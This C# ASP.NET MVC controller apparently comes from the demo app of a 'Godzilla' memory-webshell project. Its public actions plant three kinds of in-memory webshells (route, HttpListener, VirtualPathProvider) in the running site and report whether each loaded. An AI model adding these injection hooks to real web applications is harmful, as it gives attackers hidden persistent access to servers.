using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using GodzillaMemoryShellProject;

namespace Demo.Controllers
{
    public class HomeController : Controller
    {
        public ActionResult Index()
        {
            return View();
        }

        public ActionResult About()
        {
            ViewBag.Message = "Your application description page.";

            return View();
        }

        public ActionResult Contact()
        {
            ViewBag.Message = "Your contact page.";

            return View();
        }

        public string InjectHttpWebRouteMemoryShell()
        {
            //inject
            new HttpWebRouteMemoryShell();
            //check is inject
            return "InjectHttpWebRouteMemoryShell: " + HttpWebRouteMemoryShell.load;
        }
        public string InjectHttpListenerMemoryShell()
        {
            //inject
            new HttpListenerMemoryShell();
            //check is inject
            return "HttpListenerMemoryShell: " + HttpListenerMemoryShell.load;
        }
        public string InjectVirtualPathProviderMemoryShell()
        {
            //inject
            new VirtualPathProviderMemoryShell();
            //check is inject
            return "VirtualPathProviderMemoryShell: " + VirtualPathProviderMemoryShell.load;
        }
    }
}